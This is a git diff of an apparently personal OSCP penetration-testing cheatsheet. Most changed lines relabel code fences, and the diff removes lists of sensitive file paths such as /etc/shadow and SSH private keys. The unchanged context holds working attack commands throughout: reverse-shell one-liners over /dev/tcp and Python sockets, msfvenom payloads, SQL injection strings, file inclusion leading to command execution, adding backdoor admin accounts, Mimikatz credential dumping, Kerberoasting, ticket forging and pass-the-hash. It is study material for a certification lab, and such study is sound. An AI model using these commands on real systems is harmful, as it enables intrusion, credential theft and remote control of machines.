@@ -8,16 +8,9 @@ nav_order: 3
 category: docs
 img: assets/img/hacking/cheetSheet/cheetsheets.jpg
 horizontal: false
+toc:
+  sidebar: left
 ---
-
-# OSCP Cheatsheet
-
-**Prepared as part of my OSCP Preparation.**
-
-- Successfully passed the OSCP exam on May 20, 2024. Verify my achievement [here](https://www.credential.net/666b9a86-017d-48fa-894a-5c39ef1d7b7b).
-- Feel free to open a pull request if you have any corrections, improvements, or new additions!
-- You can access my cheatsheet from here: https://s4thv1k.com/posts/oscp-cheatsheet/ as well!
-- Helped over 20 individuals in passing their exam:) Please let me know if this helped you too ❤️
 
 # General
 
@@ -29,369 +22,11 @@ horizontal: false
 
 </aside>
 
-## Important Locations
-
-<details>
-<summary>Windows</summary>
-Windows
-    
-    ```powershell
-    C:/Users/Administrator/NTUser.dat
-    C:/Documents and Settings/Administrator/NTUser.dat
-    C:/apache/logs/access.log
-    C:/apache/logs/error.log
-    C:/apache/php/php.ini
-    C:/boot.ini
-    C:/inetpub/wwwroot/global.asa
-    C:/MySQL/data/hostname.err
-    C:/MySQL/data/mysql.err
-    C:/MySQL/data/mysql.log
-    C:/MySQL/my.cnf
-    C:/MySQL/my.ini
-    C:/php4/php.ini
-    C:/php5/php.ini
-    C:/php/php.ini
-    C:/Program Files/Apache Group/Apache2/conf/httpd.conf
-    C:/Program Files/Apache Group/Apache/conf/httpd.conf
-    C:/Program Files/Apache Group/Apache/logs/access.log
-    C:/Program Files/Apache Group/Apache/logs/error.log
-    C:/Program Files/FileZilla Server/FileZilla Server.xml
-    C:/Program Files/MySQL/data/hostname.err
-    C:/Program Files/MySQL/data/mysql-bin.log
-    C:/Program Files/MySQL/data/mysql.err
-    C:/Program Files/MySQL/data/mysql.log
-    C:/Program Files/MySQL/my.ini
-    C:/Program Files/MySQL/my.cnf
-    C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
-    C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
-    C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
-    C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
-    C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
-    C:/Program Files/MySQL/MySQL Server 5.0/my.ini
-    C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
-    C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
-    C:/Program Files (x86)/Apache Group/Apache/conf/access.log
-    C:/Program Files (x86)/Apache Group/Apache/conf/error.log
-    C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
-    C:/Program Files (x86)/xampp/apache/conf/httpd.conf
-    C:/WINDOWS/php.ini
-    C:/WINDOWS/Repair/SAM
-    C:/Windows/repair/system
-    C:/Windows/repair/software
-    C:/Windows/repair/security
-    C:/WINDOWS/System32/drivers/etc/hosts
-    C:/Windows/win.ini
-    C:/WINNT/php.ini
-    C:/WINNT/win.ini
-    C:/xampp/apache/bin/php.ini
-    C:/xampp/apache/logs/access.log
-    C:/xampp/apache/logs/error.log
-    C:/Windows/Panther/Unattend/Unattended.xml
-    C:/Windows/Panther/Unattended.xml
-    C:/Windows/debug/NetSetup.log
-    C:/Windows/system32/config/AppEvent.Evt
-    C:/Windows/system32/config/SecEvent.Evt
-    C:/Windows/system32/config/default.sav
-    C:/Windows/system32/config/security.sav
-    C:/Windows/system32/config/software.sav
-    C:/Windows/system32/config/system.sav
-    C:/Windows/system32/config/regback/default
-    C:/Windows/system32/config/regback/sam
-    C:/Windows/system32/config/regback/security
-    C:/Windows/system32/config/regback/system
-    C:/Windows/system32/config/regback/software
-    C:/Program Files/MySQL/MySQL Server 5.1/my.ini
-    C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
-    C:/Windows/System32/inetsrv/config/applicationHost.config
-    C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
-    ```
-</details>
-<details>
-<summary>Linux</summary>
-    
-    ```powershell
-    /etc/passwd
-    /etc/shadow
-    /etc/aliases
-    /etc/anacrontab
-    /etc/apache2/apache2.conf
-    /etc/apache2/httpd.conf
-    /etc/apache2/sites-enabled/000-default.conf
-    /etc/at.allow
-    /etc/at.deny
-    /etc/bashrc
-    /etc/bootptab
-    /etc/chrootUsers
-    /etc/chttp.conf
-    /etc/cron.allow
-    /etc/cron.deny
-    /etc/crontab
-    /etc/cups/cupsd.conf
-    /etc/exports
-    /etc/fstab
-    /etc/ftpaccess
-    /etc/ftpchroot
-    /etc/ftphosts
-    /etc/groups
-    /etc/grub.conf
-    /etc/hosts
-    /etc/hosts.allow
-    /etc/hosts.deny
-    /etc/httpd/access.conf
-    /etc/httpd/conf/httpd.conf
-    /etc/httpd/httpd.conf
-    /etc/httpd/logs/access_log
-    /etc/httpd/logs/access.log
-    /etc/httpd/logs/error_log
-    /etc/httpd/logs/error.log
-    /etc/httpd/php.ini
-    /etc/httpd/srm.conf
-    /etc/inetd.conf
-    /etc/inittab
-    /etc/issue
-    /etc/knockd.conf
-    /etc/lighttpd.conf
-    /etc/lilo.conf
-    /etc/logrotate.d/ftp
-    /etc/logrotate.d/proftpd
-    /etc/logrotate.d/vsftpd.log
-    /etc/lsb-release
-    /etc/motd
-    /etc/modules.conf
-    /etc/motd
-    /etc/mtab
-    /etc/my.cnf
-    /etc/my.conf
-    /etc/mysql/my.cnf
-    /etc/network/interfaces
-    /etc/networks
-    /etc/npasswd
-    /etc/passwd
-    /etc/php4.4/fcgi/php.ini
-    /etc/php4/apache2/php.ini
-    /etc/php4/apache/php.ini
-    /etc/php4/cgi/php.ini
-    /etc/php4/apache2/php.ini
-    /etc/php5/apache2/php.ini
-    /etc/php5/apache/php.ini
-    /etc/php/apache2/php.ini
-    /etc/php/apache/php.ini
-    /etc/php/cgi/php.ini
-    /etc/php.ini
-    /etc/php/php4/php.ini
-    /etc/php/php.ini
-    /etc/printcap
-    /etc/profile
-    /etc/proftp.conf
-    /etc/proftpd/proftpd.conf
-    /etc/pure-ftpd.conf
-    /etc/pureftpd.passwd
-    /etc/pureftpd.pdb
-    /etc/pure-ftpd/pure-ftpd.conf
-    /etc/pure-ftpd/pure-ftpd.pdb
-    /etc/pure-ftpd/putreftpd.pdb
-    /etc/redhat-release
-    /etc/resolv.conf
-    /etc/samba/smb.conf
-    /etc/snmpd.conf
-    /etc/ssh/ssh_config
-    /etc/ssh/sshd_config
-    /etc/ssh/ssh_host_dsa_key
-    /etc/ssh/ssh_host_dsa_key.pub
-    /etc/ssh/ssh_host_key
-    /etc/ssh/ssh_host_key.pub
-    /etc/sysconfig/network
-    /etc/syslog.conf
-    /etc/termcap
-    /etc/vhcs2/proftpd/proftpd.conf
-    /etc/vsftpd.chroot_list
-    /etc/vsftpd.conf
-    /etc/vsftpd/vsftpd.conf
-    /etc/wu-ftpd/ftpaccess
-    /etc/wu-ftpd/ftphosts
-    /etc/wu-ftpd/ftpusers
-    /logs/pure-ftpd.log
-    /logs/security_debug_log
-    /logs/security_log
-    /opt/lampp/etc/httpd.conf
-    /opt/xampp/etc/php.ini
-    /proc/cmdline
-    /proc/cpuinfo
-    /proc/filesystems
-    /proc/interrupts
-    /proc/ioports
-    /proc/meminfo
-    /proc/modules
-    /proc/mounts
-    /proc/net/arp
-    /proc/net/tcp
-    /proc/net/udp
-    /proc/<PID>/cmdline
-    /proc/<PID>/maps
-    /proc/sched_debug
-    /proc/self/cwd/app.py
-    /proc/self/environ
-    /proc/self/net/arp
-    /proc/stat
-    /proc/swaps
-    /proc/version
-    /root/anaconda-ks.cfg
-    /usr/etc/pure-ftpd.conf
-    /usr/lib/php.ini
-    /usr/lib/php/php.ini
-    /usr/local/apache/conf/modsec.conf
-    /usr/local/apache/conf/php.ini
-    /usr/local/apache/log
-    /usr/local/apache/logs
-    /usr/local/apache/logs/access_log
-    /usr/local/apache/logs/access.log
-    /usr/local/apache/audit_log
-    /usr/local/apache/error_log
-    /usr/local/apache/error.log
-    /usr/local/cpanel/logs
-    /usr/local/cpanel/logs/access_log
-    /usr/local/cpanel/logs/error_log
-    /usr/local/cpanel/logs/license_log
-    /usr/local/cpanel/logs/login_log
-    /usr/local/cpanel/logs/stats_log
-    /usr/local/etc/httpd/logs/access_log
-    /usr/local/etc/httpd/logs/error_log
-    /usr/local/etc/php.ini
-    /usr/local/etc/pure-ftpd.conf
-    /usr/local/etc/pureftpd.pdb
-    /usr/local/lib/php.ini
-    /usr/local/php4/httpd.conf
-    /usr/local/php4/httpd.conf.php
-    /usr/local/php4/lib/php.ini
-    /usr/local/php5/httpd.conf
-    /usr/local/php5/httpd.conf.php
-    /usr/local/php5/lib/php.ini
-    /usr/local/php/httpd.conf
-    /usr/local/php/httpd.conf.ini
-    /usr/local/php/lib/php.ini
-    /usr/local/pureftpd/etc/pure-ftpd.conf
-    /usr/local/pureftpd/etc/pureftpd.pdn
-    /usr/local/pureftpd/sbin/pure-config.pl
-    /usr/local/www/logs/httpd_log
-    /usr/local/Zend/etc/php.ini
-    /usr/sbin/pure-config.pl
-    /var/adm/log/xferlog
-    /var/apache2/config.inc
-    /var/apache/logs/access_log
-    /var/apache/logs/error_log
-    /var/cpanel/cpanel.config
-    /var/lib/mysql/my.cnf
-    /var/lib/mysql/mysql/user.MYD
-    /var/local/www/conf/php.ini
-    /var/log/apache2/access_log
-    /var/log/apache2/access.log
-    /var/log/apache2/error_log
-    /var/log/apache2/error.log
-    /var/log/apache/access_log
-    /var/log/apache/access.log
-    /var/log/apache/error_log
-    /var/log/apache/error.log
-    /var/log/apache-ssl/access.log
-    /var/log/apache-ssl/error.log
-    /var/log/auth.log
-    /var/log/boot
-    /var/htmp
-    /var/log/chttp.log
-    /var/log/cups/error.log
-    /var/log/daemon.log
-    /var/log/debug
-    /var/log/dmesg
-    /var/log/dpkg.log
-    /var/log/exim_mainlog
-    /var/log/exim/mainlog
-    /var/log/exim_paniclog
-    /var/log/exim.paniclog
-    /var/log/exim_rejectlog
-    /var/log/exim/rejectlog
-    /var/log/faillog
-    /var/log/ftplog
-    /var/log/ftp-proxy
-    /var/log/ftp-proxy/ftp-proxy.log
-    /var/log/httpd-access.log
-    /var/log/httpd/access_log
-    /var/log/httpd/access.log
-    /var/log/httpd/error_log
-    /var/log/httpd/error.log
-    /var/log/httpsd/ssl.access_log
-    /var/log/httpsd/ssl_log
-    /var/log/kern.log
-    /var/log/lastlog
-    /var/log/lighttpd/access.log
-    /var/log/lighttpd/error.log
-    /var/log/lighttpd/lighttpd.access.log
-    /var/log/lighttpd/lighttpd.error.log
-    /var/log/mail.info
-    /var/log/mail.log
-    /var/log/maillog
-    /var/log/mail.warn
-    /var/log/message
-    /var/log/messages
-    /var/log/mysqlderror.log
-    /var/log/mysql.log
-    /var/log/mysql/mysql-bin.log
-    /var/log/mysql/mysql.log
-    /var/log/mysql/mysql-slow.log
-    /var/log/proftpd
-    /var/log/pureftpd.log
-    /var/log/pure-ftpd/pure-ftpd.log
-    /var/log/secure
-    /var/log/vsftpd.log
-    /var/log/wtmp
-    /var/log/xferlog
-    /var/log/yum.log
-    /var/mysql.log
-    /var/run/utmp
-    /var/spool/cron/crontabs/root
-    /var/webmin/miniserv.log
-    /var/www/html<VHOST>/__init__.py
-    /var/www/html/db_connect.php
-    /var/www/html/utils.php
-    /var/www/log/access_log
-    /var/www/log/error_log
-    /var/www/logs/access_log
-    /var/www/logs/error_log
-    /var/www/logs/access.log
-    /var/www/logs/error.log
-    ~/.atfp_history
-    ~/.bash_history
-    ~/.bash_logout
-    ~/.bash_profile
-    ~/.bashrc
-    ~/.gtkrc
-    ~/.login
-    ~/.logout
-    ~/.mysql_history
-    ~/.nano_history
-    ~/.php_history
-    ~/.profile
-    ~/.ssh/authorized_keys
-    #id_rsa, id_ecdsa, id_ecdsa_sk, id_ed25519, id_ed25519_sk, and id_dsa
-    ~/.ssh/id_dsa
-    ~/.ssh/id_dsa.pub
-    ~/.ssh/id_rsa
-    ~/.ssh/id_edcsa
-    ~/.ssh/id_rsa.pub
-    ~/.ssh/identity
-    ~/.ssh/identity.pub
-    ~/.viminfo
-    ~/.wm_style
-    ~/.Xdefaults
-    ~/.xinitrc
-    ~/.Xresources
-    ~/.xsession
-    ```
-</details>
-
 **Discovering KDBX files**
 
 1. In Windows
 
-```powershell
+```sh
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 ```
 
@@ -459,7 +94,7 @@ nc -lvp 1234 > nmap
 
 - Downloading on Windows
 
-```powershell
+```sh
 powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
 iwr -uri http://lhost/file -Outfile file
 certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
@@ -468,14 +103,14 @@ copy \\kali\share\file .
 
 - Downloading on Linux
 
-```powershell
+```sh
 wget http://lhost/file
 curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 ```
 
 ### Windows to Kali
 
-```powershell
+```sh
 kali> impacket-smbserver -smb2support <sharename> .
 win> copy file \\KaliIP\sharename
 ```
@@ -484,7 +119,7 @@ win> copy file \\KaliIP\sharename
 
 ### Windows
 
-```powershell
+```sh
 net user hacker hacker123 /add
 net localgroup Administrators hacker /add
 net localgroup "Remote Desktop Users" hacker /ADD
@@ -492,7 +127,7 @@ net localgroup "Remote Desktop Users" hacker /ADD
 
 ### Linux
 
-```powershell
+```sh
 adduser <uname> #Interactive
 useradd <uname>
 
@@ -505,7 +140,7 @@ _Hash Analyzer_: [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsu
 
 ### fcrackzip
 
-```powershell
+```sh
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip #Cracking zip files
 ```
 
@@ -515,7 +150,7 @@ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip #Cracking zip fil
 
 - If there’s an encrypted file, convert it into john hash and crack.
 
-```powershell
+```sh
 ssh2john.py id_rsa > hash
 #Convert the obtained hash to John format(above link)
 john hashfile --wordlist=rockyou.txt
@@ -525,7 +160,7 @@ john hashfile --wordlist=rockyou.txt
 
 > [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
 
-```powershell
+```sh
 #Obtain the Hash module number
 hashcat -m <number> hash wordlists.txt --force
 ```
@@ -635,7 +270,7 @@ Invoke-Binary /opt/privsc/winPEASx64.exe
 
 ## Mimikatz
 
-```powershell
+```sh
 privilege::debug
 
 token::elevate
@@ -653,7 +288,7 @@ lsadump::lsa /patch #both these dump SAM
 
 ## Ligolo-ng
 
-```powershell
+```sh
 #Creating interface and starting it.
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
@@ -703,7 +338,7 @@ sudo ip r add <subnet> dev ligolo
 
 ## Port Scanning
 
-```powershell
+```sh
 #use -Pn option if you're getting nothing in the scan
 nmap -sC -sV <IP> -v #Basic scan
 nmap -T4 -A -p- <IP> -v #complete scan
@@ -721,7 +356,7 @@ Test-NetConnection -Port <port> <IP>   #powershell utility
 
 ## FTP enumeration
 
-```powershell
+```sh
 ftp <IP>
 #login if you have relevant creds or based on nmap scan find out whether this has an anonymous login or not, then login with Anonymous:password
 
@@ -740,7 +375,7 @@ hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for 
 
 ## SSH enumeration
 
-```powershell
+```sh
 #Login
 ssh uname@IP #enter the password in the prompt
 
@@ -760,7 +395,7 @@ hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for user
 
 ## SMB enumeration
 
-```powershell
+```sh
 sudo nbtscan -r 192.168.50.0/24 #IP or range can be provided
 
 #NSE scripts can be used
@@ -799,7 +434,7 @@ get <file> #to download file
 
 - Downloading shares is made easy—if the folder consists of several files, they will all be downloaded by this.
 
-```powershell
+```sh
 mask ""
 recurse ON
 prompt OFF
@@ -814,7 +449,7 @@ mget *
 - Look for the hostname and add the relevant one to `/etc/hosts` file.
 - Directory and file discovery - Obtain any hidden files that may contain juicy information
 
-```powershell
+```sh
 dirbuster
 gobuster dir -u http://example.com -w /path/to/wordlist.txt
 python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt
@@ -825,7 +460,7 @@ python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt
 - Default credentials: Identify the CMS or service, check for default credentials, and test them out.
 - Bruteforce
 
-```powershell
+```sh
 hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https, post, or get, which can be obtained from Burpsuite. Also, capture the response for detailed information.
 
@@ -836,7 +471,7 @@ hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:na
 - Check if other services like FTP/SMB or any other that has upload privileges are getting reflected on the web.
 - API - Fuzz further, and it can reveal some sensitive information
 
-```powershell
+```sh
 #identifying endpoints using gobuster
 gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern #pattern can be like {GOBUSTER}/v1 here v1 is just for example, it can be anything
 
@@ -850,7 +485,7 @@ curl -i http://192.168.50.16:5002/users/v1
 
 ### Wordpress
 
-```powershell
+```sh
 # basic usage
 wpscan --url "target" --verbose
 
@@ -883,7 +518,7 @@ sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr username #htt
 
 - Better use `Seclists` wordlists for better enumeration. [https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS](https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS)
 
-```powershell
+```sh
 host www.megacorpone.com
 host -t mx megacorpone.com
 host -t txt megacorpone.com
@@ -905,7 +540,7 @@ nslookup -type=TXT info.megacorptwo.com 192.168.50.151 #We are querying the info
 
 ## SMTP enumeration
 
-```powershell
+```sh
 nc -nv <IP> 25 #Version Detection
 smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode; it can be RCPT, VRFY, EXPN
 
@@ -915,7 +550,7 @@ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --a
 
 ## LDAP Enumeration
 
-```powershell
+```sh
 ldapsearch -x -H ldap://<IP>:<port> # try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.
 
 ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
@@ -945,14 +580,14 @@ python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privi
 
 ## NFS Enumeration
 
-```powershell
+```sh
 nmap -sV --script=nfs-showmount <IP>
 showmount -e <IP>
 ```
 
 ## SNMP Enumeration
 
-```powershell
+```sh
 #Nmap UDP scan
 sudo nmap <IP> -A -T4 -p- -sU -v -oN nmap-udpscan.txt
 
@@ -976,7 +611,7 @@ snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports
 
 ## RPC Enumeration
 
-```powershell
+```sh
 rpcclient -U=user $IP
 rpcclient -U="" $IP #Anonymous login
 ##Commands within in RPCclient
@@ -1008,7 +643,7 @@ lsaenumsid #SID of all users
 
 ## Directory Traversal
 
-```powershell
+```sh
 cat /etc/passwd #displaying content through absolute path
 cat ../../../etc/passwd #relative path
 
@@ -1027,7 +662,7 @@ http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Use
 
 - URL Encoding
 
-```powershell
+```sh
 #Sometimes it doesn't show if we try path, then we need to encode them
 curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```
@@ -1039,7 +674,7 @@ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
 - The main difference between Directory traversal and this attack is that we can execute commands remotely here.
 
-```powershell
+```sh
 #At first we need
 http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami #we're passing a command here
 
@@ -1055,7 +690,7 @@ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base
 
 - Remote file inclusion
 
-```powershell
+```sh
 1. Obtain a php shell
 2. host a file server
 3.
@@ -1065,7 +700,7 @@ we can also host a php reverseshell and obtain shell.
 
 ## SQL Injection
 
-```powershell
+```sh
 admin' or '1'='1
 ' or '1'='1
 " or "1"="1
@@ -1092,14 +727,14 @@ admin' or '1'='1
 
 - Blind SQL Injection - This can be identified by Time-based SQLI
 
-```powershell
+```sh
 #Application takes some time to reload, here it is 3 seconds
 http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
 ```
 
 - Manual Code Execution
 
-```powershell
+```sh
 kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
 EXECUTE sp_configure 'show advanced options', 1;
 RECONFIGURE;
@@ -1116,7 +751,7 @@ http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
 
 - SQLMap - Automated Code Execution
 
-```powershell
+```sh
 sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user #Testing on parameter names "user", we'll get confirmation
 sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump #Dumping database
 
@@ -1143,7 +778,7 @@ searchsploit -m windows/remote/46697.py #Copies the exploit to the current locat
 
 ### Msfvenom
 
-```powershell
+```sh
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 
@@ -1155,7 +790,7 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 
 ### One Liners
 
-```powershell
+```sh
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 <?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/443 0>&1');?>
@@ -1171,7 +806,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 
 - For Jenkins
 
-```powershell
+```sh
 String host="localhost";
 int port=8044;
 String cmd="cmd.exe";
@@ -1235,7 +870,7 @@ PrivescCheck.ps1
 
 - Command to check `whoami /priv`
 
-```powershell
+```sh
 #Printspoofer
 PrintSpoofer.exe -i -c powershell.exe
 PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"
@@ -1259,7 +894,7 @@ SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe 
 
 ### Binary Hijacking
 
-```powershell
+```sh
 #Identify service from winpeas
 icalcs "path" #F means full permission, we need to check we have full access on the folder
 sc qc <servicename> #find binary path variable
@@ -1318,7 +953,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-po
 
 ## Autorun
 
-```powershell
+```sh
 #For checking, it will display some information with file-location
 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
@@ -1331,7 +966,7 @@ accesschk.exe \accepteula -wvu "<path>" #returns FILE_ALL_ACCESS
 
 ## AlwaysInstallElevated
 
-```powershell
+```sh
 #For checking, it should return 1 or Ox1
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -1485,7 +1120,7 @@ pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX2
 
 ## TTY Shell
 
-```powershell
+```sh
 python -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 echo 'os.system('/bin/bash')'
@@ -1577,7 +1212,7 @@ chmod +x <binary>
 
 ### Powershell History
 
-```powershell
+```sh
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
 #Example
@@ -1586,14 +1221,14 @@ type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Co
 
 ### Searching for passwords
 
-```powershell
+```sh
 dir .s *pass* == *.config
 findstr /si password *.xml *.ini *.txt
 ```
 
 ### Searching in Registry for Passwords
 
-```powershell
+```sh
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
@@ -1605,7 +1240,7 @@ reg query HKCU /f password /t REG_SZ /s
 
 ### KDBX Files
 
-```powershell
+```sh
 #These are KeyPassX password-stored files
 cmd> dir /s /b *.kdbx
 Ps> Get-ChildItem -Recurse -Filter *.kdbx
@@ -1637,7 +1272,7 @@ net localgroup Administrators #to check local admins
 
 ### Powerview
 
-```powershell
+```sh
 Import-Module .\PowerView.ps1 #loading module to powershell, if it gives an error then change the execution policy
 Get-NetDomain #basic information about the domain
 Get-NetUser #list of all users in the domain
@@ -1665,7 +1300,7 @@ Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
 
 - Collection methods - database
 
-```powershell
+```sh
 # Sharphound - transfer sharphound.ps1 into the compromised machine
 Import-Module .\Sharphound.ps1
 Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" # collects and saved with the specified details, output will be saved in windows compromised machine
@@ -1676,7 +1311,7 @@ bloodhound-python -u 'uname' -p 'pass' -ns <rhost> -d <domain-name> -c all #outp
 
 - Running Bloodhound
 
-```powershell
+```sh
 sudo neo4j console
 # then upload the .json files obtained
 ```
@@ -1708,7 +1343,7 @@ firefox index.html
 
 ### PsLoggedon
 
-```powershell
+```sh
 # To see user logons at remote system of a domain(external tool)
 .\PsLoggedon.exe \\<computername>
 ```
@@ -1767,7 +1402,7 @@ gpp-decrypt "cpassword"
 
 ### Password Spraying
 
-```powershell
+```sh
 # Crackmapexec - check if the output shows 'Pwned!'
 crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet
 
@@ -1777,7 +1412,7 @@ kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 
 ### AS-REP Roasting
 
-```powershell
+```sh
 impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request #this gives us the hash of AS-REP Roastable accounts, from kali linux
 .\Rubeus.exe asreproast /nowrap #dumping from compromised windows host
 
@@ -1786,7 +1421,7 @@ hashcat -m 18200 hashes.txt wordlist.txt --force # cracking hashes
 
 ### Kerberoasting
 
-```powershell
+```sh
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host, and saving with customname
 
 impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine
@@ -1798,21 +1433,21 @@ hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes
 
 - Obtaining hash of an SPN user using **Mimikatz**
 
-```powershell
+```sh
 privilege::debug
 sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
 ```
 
 - Obtaining Domain SID
 
-```powershell
+```sh
 ps> whoami /user
 # this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
 ```
 
 - Forging silver ticket Ft **Mimikatz**
 
-```powershell
+```sh
 kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
 exit
 
@@ -1822,13 +1457,13 @@ ps> klist
 
 - Accessing service
 
-```powershell
+```sh
 ps> iwr -UseDefaultCredentials <servicename>://<computername>
 ```
 
 ### Secretsdump
 
-```powershell
+```sh
 secretsdump.py <domain>/<user>:<password>@<IP>
 secretsdump.py uname@IP -hashes lmhash:ntlmhash #local user
 secretsdump.py domain/uname@IP -hashes lmhash:ntlmhash #domain user
@@ -1849,7 +1484,7 @@ secretsdump.py <domain>/<user>:<password>@<IP> -just-dc-ntlm
 
 > _Always pass the full hash to these tools!_
 
-```powershell
+```sh
 psexec.py <domain>/<user>:<password1>@<IP>
 # the user should have write access to Admin share then only we can get sesssion
 
@@ -1872,7 +1507,7 @@ atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68a
 
 ### winrs
 
-```powershell
+```sh
 winrs -r:<computername> -u:<user> -p:<password> "command"
 # run this and check whether the user has access on the machine, if you have access then run a powershell reverse-shell
 # run this on windows session
@@ -1882,7 +1517,7 @@ winrs -r:<computername> -u:<user> -p:<password> "command"
 
 - If stuck make use of [Wiki](https://www.crackmapexec.wiki/)
 
-```powershell
+```sh
 crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
 crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # Bruteforcing attack, smb can be replaced. Shows "Pwned"
 crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' #grepping the way out!
@@ -1920,7 +1555,7 @@ help #run this command to view some others, running individual commands give inf
 
 ### Pass the ticket
 
-```powershell
+```sh
 .\mimikatz.exe
 sekurlsa::tickets /export
 kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
@@ -1930,7 +1565,7 @@ dir \\<RHOST>\admin$
 
 ### DCOM
 
-```powershell
+```sh
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
 
 $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
